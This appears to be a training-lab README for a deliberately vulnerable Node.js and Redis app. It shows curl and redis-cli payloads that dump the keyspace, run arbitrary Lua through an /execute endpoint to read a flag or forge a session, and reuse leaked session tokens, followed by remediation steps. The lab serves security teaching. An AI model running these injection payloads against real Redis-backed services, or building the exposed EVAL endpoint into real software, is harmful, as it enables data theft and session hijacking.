# Lab 12 — NoSQL Injection (Redis Key Injection + KEYS Scan) 🔴

**Port:** `8012` | **Stack:** Node.js + Redis | **Difficulty:** Intermediate

---

## 🕳️ Security Loopholes

1. **KEYS Pattern Exposed** — `/search?pattern=*` scans entire Redis keyspace (also a DoS risk)
2. **Key Name Injection** — User ID injected into key name; can be manipulated to target other key prefixes
3. **EVAL Endpoint** — Lets users run arbitrary Lua scripts against Redis

---

## 🎯 Attack Scenarios

### Scenario A — Dump All Redis Keys
```bash
docker compose up -d

# Dump everything in Redis
curl "http://localhost:8012/search?pattern=*"

# Target specific prefixes
curl "http://localhost:8012/search?pattern=user:*"
curl "http://localhost:8012/search?pattern=api_key:*"
curl "http://localhost:8012/search?pattern=session:*"
```

### Scenario B — Direct Redis CLI Access (if port exposed)
```bash
# Redis is on internal network but if it were exposed:
redis-cli -h localhost -p 6379
> KEYS *
> GET flag
> HGETALL user:1
```

### Scenario C — Lua Script Injection via /execute
```bash
# Read the hidden flag
curl -X POST http://localhost:8012/execute \
  -H "Content-Type: application/json" \
  -d '{"script": "return redis.call(\"GET\", KEYS[1])", "key": "flag"}'

# Dump all keys via Lua
curl -X POST http://localhost:8012/execute \
  -H "Content-Type: application/json" \
  -d '{"script": "return redis.call(\"KEYS\", \"*\")", "key": ""}'

# Escalate: write new admin session
curl -X POST http://localhost:8012/execute \
  -H "Content-Type: application/json" \
  -d '{"script": "redis.call(\"SET\", \"session:hacked\", \"1\"); return \"ok\"", "key": ""}'
```

### Scenario D — Session Fixation via Key Knowledge
```bash
# From the KEYS dump, we know session tokens
curl "http://localhost:8012/validate-session?token=token-abc"  # Gets admin's user data
```

---

## 🔐 How to Fix

```javascript
// 1. NEVER expose KEYS command — use SCAN with cursor instead, and never via API
// 2. Validate and sanitize key components
const safeId = parseInt(id, 10);
if (isNaN(safeId) || safeId < 1) return res.status(400).json({ error: 'Invalid ID' });

// 3. Remove the /execute endpoint entirely — never expose EVAL to users
// 4. Use Redis AUTH and disable dangerous commands in redis.conf:
//    rename-command KEYS ""
//    rename-command EVAL ""
//    rename-command FLUSHALL ""
```
